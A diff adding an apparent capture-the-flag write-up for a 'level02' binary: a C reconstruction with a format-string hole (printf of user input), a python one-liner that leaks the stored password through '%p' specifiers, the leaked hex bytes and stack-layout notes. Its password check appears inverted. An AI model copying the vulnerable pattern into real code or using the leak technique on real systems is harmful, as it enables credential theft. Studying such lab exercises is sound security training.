@@ -1,0 +1,95 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+	char **av;
+	int ac;
+	char try[100];
+	char password[44];
+	char username[100];
+	int nb2;
+	FILE *pass;
+
+	ac = argc;
+	av = argv;
+
+	memset(username, '\0', 100);
+	memset(password, '\0', 41);
+
+	pass = fopen("/home/users/level03/.pass", "r");
+
+	if (pass == NULL) {
+		// ...
+		exit(1);
+	}
+
+	nb2 = fread(password, 1, 41, pass);
+	if (nb2 != 41)
+	{
+		// ...
+		exit(1);
+	}
+	password[strcspn(password, "\n")] = '\0';
+
+	printf("...");
+
+	printf("--[ Username: ");
+	fgets(username, 100, stdin);
+	username[strcspn(username, "\n")] = '\0';
+
+	printf("--[ Password: ");
+	fgets(try, 100, stdin);
+	try[strcspn(try, "\n")] = '\0';
+
+	if (strncmp(password, try, 41)) {
+		system("/bin/sh");
+	}
+	printf(username);
+	puts(" does not have access!");
+	exit(1);
+}
+/*
+nb param reg 		= 5
+Password			= 0x7fffffffe530;
+premier para stack	= 0x7fffffffe4b0
+
+Diff				= 128
+
+ce qui donne : 128 / 8 + 5 = 21 params et donc le debut du buffeur est au 22eme parametre
+
+ python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p' + '\n' + 'a' + '\n'" | /home/users/level02/level02
+
+75 6e 50 52 34 37 68 48
+45 41 4a 35 61 73 39 51
+37 7a 71 43 57 4e 67 58
+35 4a 35 68 6e 47 58 73
+48 33 67 50 66 4b 39 4d
+
+a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a
+48 68 37 34 52 50 6e 75 51 39 73 61 35 4a 41 45 58 67 4e 57 43 71 7a 37 73 58 47 6e 68 35 4a 35 4d 39 4b 66 50 67 33 48
+
+
+
+
+stack : 288
+
+
+rsp = rbp - 0x120
+
+char **av 					: 0x120 - 0x118
+?[4]								:	0x118 - 0x114
+int ac 	 						: 0x114 - 0x110
+char b3[100]  			: 0x110 - 0xac
+?[12]          			: 0xac	- 0xa0
+char password[44]		: 0xa0	- 0x74
+?[4]								: 0x74	- 0x70
+char username[100]	: 0x70 	- 0xc
+int     nb2					: 0xc   - 0x8
+FILE*   pass				: 0x8   - 0x0
+
+rbp
+
+RDI, RSI, RDX, RCX, R8, R9
+
+*/
